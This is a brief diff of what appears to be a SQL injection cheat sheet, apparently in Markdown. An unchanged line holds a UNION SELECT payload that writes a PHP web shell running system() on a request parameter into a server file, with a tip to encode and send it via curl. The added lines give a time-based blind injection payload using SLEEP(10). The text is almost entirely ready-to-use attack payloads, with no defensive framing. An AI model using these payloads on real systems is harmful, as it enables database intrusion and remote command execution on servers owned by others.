@@ -6,3 +6,8 @@ test' union select '<?php echo system($_REQUEST["bingo"]); ?>' into outfile '/sr
 ```
 
 - If it does not work, encode all characters and send via `curl`.
+
+## Blind
+```
+TEST' UNION SELECT SLEEP(10);-- -
+```
